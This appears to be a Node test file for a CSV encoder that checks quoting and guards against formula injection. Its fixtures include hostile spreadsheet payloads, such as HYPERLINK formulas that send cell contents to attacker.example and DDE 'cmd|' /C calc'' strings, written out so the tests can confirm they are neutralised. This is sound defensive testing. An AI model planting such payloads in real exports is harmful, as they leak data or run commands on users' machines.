import assert from "node:assert/strict";
import { test } from "node:test";
import { csvDecimal, csvIsoDate, encodeCsv, encodeCsvCell } from "../src/utils/csv.ts";
import { parseCsv, values } from "./fixtures/rfc4180.mjs";
import { READINGS, cellsUnder, formulaLike } from "./fixtures/spreadsheet-readings.mjs";

const BOM = "\u{FEFF}";
const GUARD = "\t'";
const header = ["Text", "Number"];
function roundTrip(records) {
  const document = encodeCsv(header, records);
  assert(document.startsWith(BOM), "UTF-8 byte order mark");
  assert(document.endsWith("\r\n"), "CRLF after the last record");
  return parseCsv(document.slice(BOM.length));
}

const awkward = [
  "plain",
  "comma, separated",
  "semi; colon",
  'Worker "A"',
  '"fully quoted"',
  "line\r\nbreak",
  "bare\nLF",
  "bare\rCR",
  "tab\tinside",
  "trailing\r\n",
  "  leading and trailing spaces  ",
  "caf\u{E9} \u{65E5}\u{672C}\u{8A9E} \u{645}\u{631}\u{62D}\u{628}\u{627} \u{1F600} e\u{301}",
  "a=b",
  "1-2",
  "email@example.test",
  "it's",
  "'already quoted",
  "",
];

test("text cells round-trip through a strict RFC 4180 reader", () => {
  const records = roundTrip(awkward.map((text) => [text, csvDecimal(1)]));
  assert.deepEqual(values(records), [header, ...awkward.map((text) => [text, "1.00"])]);
  for (const [text, number] of records.slice(1)) {
    assert.equal(text.quoted, text.value !== "", `non-empty text is always quoted: ${JSON.stringify(text.value)}`);
    assert.equal(number.quoted, false);
  }
});

// [input, exact text a comma-separated RFC 4180 reader gets back]
const neutralised = [
  ["=1+1", `${GUARD}=1+1`],
  ["+1+1", `${GUARD}+1+1`],
  ["-1+1", `${GUARD}-1+1`],
  ["@SUM(A1:A2)", `${GUARD}@SUM(A1:A2)`],
  ["-5", `${GUARD}-5`],
  ["\u{FF1D}1+1", `${GUARD}\u{FF1D}1+1`],
  ["\u{FF0B}1", `${GUARD}\u{FF0B}1`],
  ["\u{FF0D}1", `${GUARD}\u{FF0D}1`],
  ["\u{FF20}SUM(A1)", `${GUARD}\u{FF20}SUM(A1)`],
  [" =1+1", `${GUARD} =1+1`],
  ["\u{A0}=1+1", `${GUARD}\u{A0}=1+1`],
  ["\u{200B}=1+1", `${GUARD}\u{200B}=1+1`],
  ["\u{1}=1+1", `${GUARD}\u{1}=1+1`],
  ['"=1+1"', `${GUARD}"=1+1"`],
  ["'=1+1", `${GUARD}'=1+1`],
  ['=HYPERLINK("http://attacker.example/?d="&A1,"Open")', `${GUARD}=HYPERLINK("http://attacker.example/?d="&A1,"Open")`],
  ["=cmd|' /C calc'!A0", `${GUARD}=cmd|' /C calc'!A0`],
  // A cell that starts with a tab, CR or LF is guarded, and so is what follows it.
  ["\t=1+1", `${GUARD}\t${GUARD}=1+1`],
  ["\r=1+1", `${GUARD}\r${GUARD}=1+1`],
  ["\n=1+1", `${GUARD}\n${GUARD}=1+1`],
  ["\tplain tab", `${GUARD}\tplain tab`],
  // Every segment a `,` `;` tab or line-break reading would start a cell with.
  ["notes;=1+1;tail", `notes;${GUARD}=1+1;tail`],
  ["x;=cmd|' /C calc'!A0;y", `x;${GUARD}=cmd|' /C calc'!A0;y`],
  ['Fixed bug;=HYPERLINK("http://attacker.example/?d="&A1);', `Fixed bug;${GUARD}=HYPERLINK("http://attacker.example/?d="&A1);`],
  ["a,=1+1,b", `a,${GUARD}=1+1,b`],
  ["x; -1+1", `x;${GUARD} -1+1`],
  ['x;"=1+1";y', `x;${GUARD}"=1+1";y`],
  ["x';=1+1", `x';${GUARD}=1+1`],
  ["x;'=1+1", `x;${GUARD}'=1+1`],
  ['x",=1+1', `x",${GUARD}=1+1`],
  ["note\n=1+1\nmore", `note\n${GUARD}=1+1\nmore`],
  ["note\r=1+1\rmore", `note\r${GUARD}=1+1\rmore`],
  ["note\r\n=1+1\r\nmore", `note\r\n${GUARD}=1+1\r\nmore`],
  ["notes\t=1+1\ttail", `notes\t${GUARD}=1+1\ttail`],
  ["=1+1\ttail", `${GUARD}=1+1\ttail`],
  ["x\u{2028}@SUM(1)", `x\u{2028}${GUARD}@SUM(1)`],
  ["x\u{B}+1", `x\u{B}${GUARD}+1`],
  ["x;\u{FF1D}1", `x;${GUARD}\u{FF1D}1`],
  ['=1+2";=1+2', `${GUARD}=1+2";${GUARD}=1+2`],
  ["=1+2'\" ;,=1+2", `${GUARD}=1+2'" ;,${GUARD}=1+2`],
  ["Tasks:\n- fix\n- test", `Tasks:\n${GUARD}- fix\n${GUARD}- test`],
];

test("formula-leading segments get a tab-and-apostrophe guard and the text is otherwise preserved", () => {
  const records = roundTrip(neutralised.map(([text]) => [text, null]));
  assert.deepEqual(values(records).slice(1), neutralised.map(([, expected]) => [expected, ""]));
  for (const [text, expected] of neutralised) assert.equal(expected.split(GUARD).join(""), text);
  // OWASP's examples: quoted, quotes doubled, guarded at the start and after the in-cell `;`.
  assert.equal(encodeCsvCell('=1+2";=1+2'), `"${GUARD}=1+2"";${GUARD}=1+2"`);
});

test("no comma, semicolon, tab or line-split reading starts a cell with a formula", () => {
  const inputs = [...awkward, ...neutralised.map(([text]) => text)];
  const document = encodeCsv(
    ["Date", "Text", "Number", "Text again"],
    inputs.map((text) => [csvIsoDate("2026-04-01"), text, csvDecimal(-5), text]),
  ).slice(BOM.length);
  for (const reading of READINGS) {
    const cells = cellsUnder(document, reading);
    assert(cells.length > inputs.length, reading.name);
    assert.deepEqual(cells.filter(formulaLike), [], reading.name);
  }
  // The unguarded encoding is caught by the same check under `;`, tab and line-split readings.
  const naive = inputs.map((text) => `2026-04-01,"${text.replace(/"/g, '""')}",-5.00`).join("\r\n") + "\r\n";
  for (const reading of READINGS.filter(({ separators }) => separators.length === 1 && separators[0] !== ",")) {
    assert.notDeepEqual(cellsUnder(naive, reading).filter(formulaLike), [], reading.name);
  }
});

test("numeric cells stay bare numbers, including negative values", () => {
  const records = roundTrip([
    ["negative", csvDecimal(-5)],
    ["fraction", csvDecimal(1.5)],
    ["rounded", csvDecimal(0.1 + 0.2)],
    ["zero", csvDecimal(0)],
    ["empty", null],
    ["overflow", csvDecimal(1e308 * 24)],
    ["not a number", csvDecimal(Number.NaN)],
  ]);
  assert.deepEqual(values(records).slice(1).map(([, number]) => number), ["-5.00", "1.50", "0.30", "0.00", "", "", ""]);
  assert(records.slice(1).every(([, number]) => !number.quoted));
});

test("ISO dates are bare; anything else in a date column is encoded as text", () => {
  const records = roundTrip([
    ["iso", csvIsoDate("2026-04-01")],
    ["legacy", csvIsoDate("=1+1")],
    ["loose", csvIsoDate("2026-4-1")],
  ]);
  assert.deepEqual(values(records).slice(1).map(([, date]) => date), ["2026-04-01", `${GUARD}=1+1`, "2026-4-1"]);
  assert.deepEqual(records.slice(1).map(([, date]) => date.quoted), [false, true, true]);
});

test("records must match the header width", () => {
  assert.throws(() => encodeCsv(header, [["only one"]]), RangeError);
  assert.equal(encodeCsv(header, []), `${BOM}"Text","Number"\r\n`);
});
